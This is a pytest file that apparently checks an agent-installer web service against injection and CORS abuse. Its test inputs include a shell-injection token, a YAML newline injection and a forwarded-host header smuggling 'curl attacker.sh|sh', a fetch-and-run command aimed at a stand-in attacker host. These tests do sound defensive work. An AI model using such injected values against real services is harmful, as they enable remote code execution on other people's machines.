from fastapi.testclient import TestClient
from installer_service.main import app


client = TestClient(app)


def test_installer_blocks_shell_injection_in_token():
    res = client.get('/agent/install.sh?token=abc";id;#')
    assert res.status_code == 400


def test_installer_blocks_yaml_injection_in_cluster_id():
    res = client.get('/agent/install.yaml?token=valid_tok_123&cluster_id=c1%0A%20%20evil:%20true')
    assert res.status_code == 400


def test_installer_ignores_untrusted_x_forwarded_host_injection():
    res = client.get(
        '/agent/install.sh',
        headers={'X-Forwarded-Host': 'evil.com";curl attacker.sh|sh #', 'Host': 'localhost:8100'},
    )
    assert res.status_code == 200
    assert 'evil.com' not in res.text
    assert 'curl attacker.sh' not in res.text


def test_installer_cors_does_not_allow_arbitrary_origin():
    res = client.options(
        '/health',
        headers={'Origin': 'https://evil.attacker.com', 'Access-Control-Request-Method': 'GET'},
    )
    assert res.headers.get('access-control-allow-origin') != '*'
    assert res.headers.get('access-control-allow-origin') != 'https://evil.attacker.com'
